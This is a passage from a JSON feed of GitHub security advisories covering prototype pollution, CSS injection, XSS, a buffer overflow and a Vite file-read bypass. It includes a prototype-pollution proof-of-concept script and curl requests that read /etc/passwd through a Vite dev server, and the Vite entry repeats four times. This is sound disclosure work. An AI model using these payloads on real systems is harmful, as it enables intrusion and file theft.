href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-31475\">https://nvd.nist.gov/vuln/detail/CVE-2025-31475</a></li>\n<li><a href=\"https://github.com/AmauriC/tarteaucitron.js/commit/74c354c413ee3f82dff97a15a0a43942887c2b5b\">https://github.com/AmauriC/tarteaucitron.js/commit/74c354c413ee3f82dff97a15a0a43942887c2b5b</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4hwx-xcc5-2hfc\">https://github.com/advisories/GHSA-4hwx-xcc5-2hfc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4hwx-xcc5-2hfc",
            "title": "[tarteaucitronjs] tarteaucitron.js allows prototype pollution via custom text injection",
            "date_modified": "2025-04-07T16:38:54.000Z",
            "date_published": "2025-04-07T16:38:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4hwx-xcc5-2hfc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability was identified in <code>tarteaucitron.js</code>, where user-controlled inputs for element dimensions (<code>width</code> and <code>height</code>) were not properly validated. This allowed an attacker with direct access to the site's source code or a CMS plugin to set values like <code>100%;height:100%;position:fixed;</code>, potentially covering the entire viewport and facilitating clickjacking attacks.</p>\n<h2 id=\"impact\">Impact</h2>\n<p>An attacker with high privileges could exploit this vulnerability to:</p>\n<ul>\n<li>Overlay malicious UI elements on top of legitimate content,</li>\n<li>Trick users into interacting with hidden elements (clickjacking),</li>\n<li>Disrupt the intended functionality and accessibility of the website.</li>\n</ul>\n<h2 id=\"fix-httpsgithubcomamaurictarteaucitronjscommit25fcf828aaa55306ddc09cfbac9a6f8f126e2d07\">Fix <a href=\"https://github.com/AmauriC/tarteaucitron.js/commit/25fcf828aaa55306ddc09cfbac9a6f8f126e2d07\">https://github.com/AmauriC/tarteaucitron.js/commit/25fcf828aaa55306ddc09cfbac9a6f8f126e2d07</a></h2>\n<p>The issue was resolved by enforcing strict validation and sanitization of user-provided CSS values to prevent unintended UI manipulation.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/AmauriC/tarteaucitron.js/security/advisories/GHSA-7524-3396-fqv3\">https://github.com/AmauriC/tarteaucitron.js/security/advisories/GHSA-7524-3396-fqv3</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-31138\">https://nvd.nist.gov/vuln/detail/CVE-2025-31138</a></li>\n<li><a href=\"https://github.com/AmauriC/tarteaucitron.js/commit/25fcf828aaa55306ddc09cfbac9a6f8f126e2d07\">https://github.com/AmauriC/tarteaucitron.js/commit/25fcf828aaa55306ddc09cfbac9a6f8f126e2d07</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7524-3396-fqv3\">https://github.com/advisories/GHSA-7524-3396-fqv3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7524-3396-fqv3",
            "title": "[tarteaucitronjs] tarteaucitron.js allows UI manipulation via unrestricted CSS injection",
            "date_modified": "2025-04-07T16:38:25.000Z",
            "date_published": "2025-04-07T16:38:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7524-3396-fqv3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A prototype pollution in the lib.Logger function of eazy-logger v4.0.1 allows attackers to cause a Denial of Service (DoS) via supplying a crafted payload.</p>\n<p>An attacker can supply a payload with <code>Object.prototype</code> setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.</p>\n<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., <code>child_process.exec</code>, <code>eval</code>), it could enable an attacker to execute arbitrary commands within the application's context.</p>\n<h2 id=\"proof-of-concept\">Proof of Concept</h2>\n<pre><code class=\"language-js\">(async () =&gt; {\nconst lib = await import('eazy-logger');\nvar someObj = {}\nconsole.log(\"Before Attack: \", JSON.stringify({}.__proto__));\ntry {\n// for multiple functions, uncomment only one for each execution.\nlib.Logger (JSON.parse('{\"__proto__\":{\"pollutedKey\":123}}'))\n} catch (e) { }\nconsole.log(\"After Attack: \", JSON.stringify({}.__proto__));\ndelete Object.prototype.pollutedKey;\n})();\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-57075\">https://nvd.nist.gov/vuln/detail/CVE-2024-57075</a></li>\n<li><a href=\"https://gist.github.com/tariqhawis/c601f7f85146510ca899a7406a03aba5\">https://gist.github.com/tariqhawis/c601f7f85146510ca899a7406a03aba5</a></li>\n<li><a href=\"https://github.com/shakyShane/eazy-logger/commit/a8baa6fe441d19ffa9916eba367016b7937a28fd\">https://github.com/shakyShane/eazy-logger/commit/a8baa6fe441d19ffa9916eba367016b7937a28fd</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r7jx-5m6m-cpg9\">https://github.com/advisories/GHSA-r7jx-5m6m-cpg9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r7jx-5m6m-cpg9",
            "title": "[eazy-logger] eazy-logger prototype pollution",
            "date_modified": "2025-04-07T12:34:02.000Z",
            "date_published": "2025-02-06T06:31:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r7jx-5m6m-cpg9"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Versions of the package expand-object from 0.0.0 to 0.4.2 are vulnerable to Prototype Pollution in the expand() function in index.js. This function expands the given string into an object and allows a nested property to be set without checking the provided keys for sensitive properties like <strong>proto</strong>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-3197\">https://nvd.nist.gov/vuln/detail/CVE-2025-3197</a></li>\n<li><a href=\"https://gist.github.com/miguelafmonteiro/d8f66af61d14e06338b688f90c4dfa7c\">https://gist.github.com/miguelafmonteiro/d8f66af61d14e06338b688f90c4dfa7c</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-JS-EXPANDOBJECT-5821390\">https://security.snyk.io/vuln/SNYK-JS-EXPANDOBJECT-5821390</a></li>\n<li><a href=\"https://github.com/jonschlinkert/expand-object/blob/master/index.js#L13\">https://github.com/jonschlinkert/expand-object/blob/master/index.js#L13</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4vjr-hfpp-2m7w\">https://github.com/advisories/GHSA-4vjr-hfpp-2m7w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4vjr-hfpp-2m7w",
            "title": "[expand-object] expand-object Vulnerable to Prototype Pollution via the expand() Function",
            "date_modified": "2025-04-04T18:24:06.000Z",
            "date_published": "2025-04-04T06:34:23.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4vjr-hfpp-2m7w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Versions of the package bigint-buffer from 0.0.0 to 1.1.5 are vulnerable to Buffer Overflow in the toBigIntLE() function. Attackers can exploit this to crash the application.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-3194\">https://nvd.nist.gov/vuln/detail/CVE-2025-3194</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-JS-BIGINTBUFFER-3364597\">https://security.snyk.io/vuln/SNYK-JS-BIGINTBUFFER-3364597</a></li>\n<li><a href=\"https://www.usenix.org/system/files/sec23fall-prepub-262_staicu.pdf\">https://www.usenix.org/system/files/sec23fall-prepub-262_staicu.pdf</a></li>\n<li><a href=\"https://github.com/no2chem/bigint-buffer/blob/master/src/index.ts#L25\">https://github.com/no2chem/bigint-buffer/blob/master/src/index.ts#L25</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3gc7-fjrx-p6mg\">https://github.com/advisories/GHSA-3gc7-fjrx-p6mg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3gc7-fjrx-p6mg",
            "title": "[bigint-buffer] bigint-buffer Vulnerable to Buffer Overflow via toBigIntLE() Function",
            "date_modified": "2025-04-04T18:23:46.000Z",
            "date_published": "2025-04-04T06:34:22.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3gc7-fjrx-p6mg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>All versions of the package react-draft-wysiwyg are vulnerable to Cross-site Scripting (XSS) via the Embedded button which will then result in saving the payload in the </p>",
            "url": "https://github.com/advisories/GHSA-fq5x-7292-2p5r",
            "title": "[react-draft-wysiwyg] React Draft Wysiwyg Cross-Site Scripting (XSS) via the Embedded Button",
            "date_modified": "2025-04-04T18:23:09.000Z",
            "date_published": "2025-04-04T06:34:22.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fq5x-7292-2p5r"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The contents of arbitrary files can be returned to the browser.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Only apps explicitly exposing the Vite dev server to the network (using --host or <a href=\"https://vitejs.dev/config/server-options.html#server-host\">server.host config option</a>) are affected..</p>\n<h3 id=\"details\">Details</h3>\n<h4 id=\"svg\"><code>.svg</code></h4>\n<p>Requests ending with <code>.svg</code> are loaded at this line.\n<a href=\"https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290\">https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290</a>\nBy adding <code>?.svg</code> with <code>?.wasm?init</code> or with <code>sec-fetch-dest: script</code> header, the restriction was able to bypass.</p>\n<p>This bypass is only possible if the file is smaller than <a href=\"https://vite.dev/config/build-options.html#build-assetsinlinelimit\"><code>build.assetsInlineLimit</code></a> (default: 4kB) and when using Vite 6.0+.</p>\n<h4 id=\"relative-paths\">relative paths</h4>\n<p>The check was applied before the id normalization. This allowed requests to bypass with relative paths (e.g. <code>../../</code>).</p>\n<h3 id=\"poc\">PoC</h3>\n<pre><code class=\"language-bash\">npm create vite@latest\ncd vite-project/\nnpm install\nnpm run dev\n</code></pre>\n<p>send request to read <code>etc/passwd</code></p>\n<pre><code class=\"language-bash\">curl 'http://127.0.0.1:5173/etc/passwd?.svg?.wasm?init'\n</code></pre>\n<pre><code class=\"language-bash\">curl 'http://127.0.0.1:5173/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&amp;?raw'\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x\">https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-31486\">https://nvd.nist.gov/vuln/detail/CVE-2025-31486</a></li>\n<li><a href=\"https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647\">https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647</a></li>\n<li><a href=\"https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290\">https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xcj6-pq6g-qj4x\">https://github.com/advisories/GHSA-xcj6-pq6g-qj4x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xcj6-pq6g-qj4x",
            "title": "[vite] Vite allows server.fs.deny to be bypassed with .svg or relative paths",
            "date_modified": "2025-04-04T14:20:06.000Z",
            "date_published": "2025-04-04T14:20:05.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xcj6-pq6g-qj4x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The contents of arbitrary files can be returned to the browser.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Only apps explicitly exposing the Vite dev server to the network (using --host or <a href=\"https://vitejs.dev/config/server-options.html#server-host\">server.host config option</a>) are affected..</p>\n<h3 id=\"details\">Details</h3>\n<h4 id=\"svg\"><code>.svg</code></h4>\n<p>Requests ending with <code>.svg</code> are loaded at this line.\n<a href=\"https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290\">https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290</a>\nBy adding <code>?.svg</code> with <code>?.wasm?init</code> or with <code>sec-fetch-dest: script</code> header, the restriction was able to bypass.</p>\n<p>This bypass is only possible if the file is smaller than <a href=\"https://vite.dev/config/build-options.html#build-assetsinlinelimit\"><code>build.assetsInlineLimit</code></a> (default: 4kB) and when using Vite 6.0+.</p>\n<h4 id=\"relative-paths\">relative paths</h4>\n<p>The check was applied before the id normalization. This allowed requests to bypass with relative paths (e.g. <code>../../</code>).</p>\n<h3 id=\"poc\">PoC</h3>\n<pre><code class=\"language-bash\">npm create vite@latest\ncd vite-project/\nnpm install\nnpm run dev\n</code></pre>\n<p>send request to read <code>etc/passwd</code></p>\n<pre><code class=\"language-bash\">curl 'http://127.0.0.1:5173/etc/passwd?.svg?.wasm?init'\n</code></pre>\n<pre><code class=\"language-bash\">curl 'http://127.0.0.1:5173/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&amp;?raw'\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x\">https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-31486\">https://nvd.nist.gov/vuln/detail/CVE-2025-31486</a></li>\n<li><a href=\"https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647\">https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647</a></li>\n<li><a href=\"https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290\">https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xcj6-pq6g-qj4x\">https://github.com/advisories/GHSA-xcj6-pq6g-qj4x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xcj6-pq6g-qj4x",
            "title": "[vite] Vite allows server.fs.deny to be bypassed with .svg or relative paths",
            "date_modified": "2025-04-04T14:20:06.000Z",
            "date_published": "2025-04-04T14:20:05.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xcj6-pq6g-qj4x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The contents of arbitrary files can be returned to the browser.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Only apps explicitly exposing the Vite dev server to the network (using --host or <a href=\"https://vitejs.dev/config/server-options.html#server-host\">server.host config option</a>) are affected..</p>\n<h3 id=\"details\">Details</h3>\n<h4 id=\"svg\"><code>.svg</code></h4>\n<p>Requests ending with <code>.svg</code> are loaded at this line.\n<a href=\"https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290\">https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290</a>\nBy adding <code>?.svg</code> with <code>?.wasm?init</code> or with <code>sec-fetch-dest: script</code> header, the restriction was able to bypass.</p>\n<p>This bypass is only possible if the file is smaller than <a href=\"https://vite.dev/config/build-options.html#build-assetsinlinelimit\"><code>build.assetsInlineLimit</code></a> (default: 4kB) and when using Vite 6.0+.</p>\n<h4 id=\"relative-paths\">relative paths</h4>\n<p>The check was applied before the id normalization. This allowed requests to bypass with relative paths (e.g. <code>../../</code>).</p>\n<h3 id=\"poc\">PoC</h3>\n<pre><code class=\"language-bash\">npm create vite@latest\ncd vite-project/\nnpm install\nnpm run dev\n</code></pre>\n<p>send request to read <code>etc/passwd</code></p>\n<pre><code class=\"language-bash\">curl 'http://127.0.0.1:5173/etc/passwd?.svg?.wasm?init'\n</code></pre>\n<pre><code class=\"language-bash\">curl 'http://127.0.0.1:5173/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&amp;?raw'\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x\">https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-31486\">https://nvd.nist.gov/vuln/detail/CVE-2025-31486</a></li>\n<li><a href=\"https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647\">https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647</a></li>\n<li><a href=\"https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290\">https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xcj6-pq6g-qj4x\">https://github.com/advisories/GHSA-xcj6-pq6g-qj4x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xcj6-pq6g-qj4x",
            "title": "[vite] Vite allows server.fs.deny to be bypassed with .svg or relative paths",
            "date_modified": "2025-04-04T14:20:06.000Z",
            "date_published": "2025-04-04T14:20:05.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xcj6-pq6g-qj4x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The contents of arbitrary files can be returned to the browser.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Only apps explicitly exposing the Vite dev server to the network (using --host or <a href=\"https://vitejs.dev/config/server-options.html#server-host\">server.host config option</a>) are affected..</p>\n<h3 id=\"details\">Details</h3>\n<h4 id=\"svg\"><code>.svg</code></h4>\n<p>Requests ending with <code>.svg</code> are loaded at this line.\n<a href=\"https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290\">https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290</a>\nBy adding <code>?.svg</code> with <code>?.wasm?init</code> or with <code>sec-fetch-dest: script</code> header, the restriction was able to bypass.</p>\n<p>This bypass is only possible if the file is smaller than <a href=\"https://vite.dev/config/build-options.html#build-assetsinlinelimit\"><code>build.assetsInlineLimit</code></a> (default: 4kB) and when using Vite 6.0+.</p>\n<h4 id=\"relative-paths\">relative paths</h4>\n<p>The check was applied before the id normalization. This allowed requests to bypass with relative paths (e.g. <code>../../</code>).</p>\n<h3 id=\"poc\">PoC</h3>\n<pre><code class=\"language-bash\">npm create vite@latest\ncd vite-project/\nnpm install\nnpm run dev\n</code></pre>\n<p>send request to read <code>etc/passwd</code></p>\n<pre><code class=\"language-bash\">curl 'http://127.0.0.1:5173/etc/passwd?.svg?.wasm?init'\n</code></pre>\n<pre><code class=\"language-bash\">curl 'http://127.0.0.1:5173/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&amp;?raw'\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x\">https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-31486\">https://nvd.nist.gov/vuln/detail/CVE-2025-31486</a></li>\n<li><a href=\"https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647\">https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647</a></li>\n<li><a href=\"https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290\">https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xcj6-pq6g-qj4x\">https://github.com/advisories/GHSA-xcj6-pq6g-qj4x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xcj6-pq6g-qj4x",
            "title": "[vite] Vite allows server.fs.deny to be bypassed with .svg or relative paths",
            "date_modified": "2025-04-04T14:20:06.000Z",
            "date_published": "2025-04-04T14:20:05.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xcj6-pq6g-qj4x"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}